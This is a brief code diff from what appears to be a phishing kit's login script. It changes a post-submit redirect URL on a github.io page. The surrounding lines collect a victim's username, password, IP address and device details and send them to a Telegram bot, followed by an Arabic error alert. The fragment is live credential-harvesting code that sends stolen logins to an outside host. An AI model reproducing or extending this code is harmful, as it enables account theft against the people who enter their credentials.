@@ -30,7 +30,7 @@ document.getElementById('btnSubmit').addEventListener('click', async function(e)
         const data = { username, password, ip, deviceInfo };
         
         await sendToTelegram(data, TOKEN, CHAT_ID);
-        window.location.href = "https://moutamadris-mem-gow.github.io/fb/viwer.html";
+        window.location.href = "https://moutamadris-mem-gow.github.io/fa/viwer.html";
     } catch (err) {
         console.error('Error:', err);
         alert('حدث خطأ أثناء إرسال البيانات');
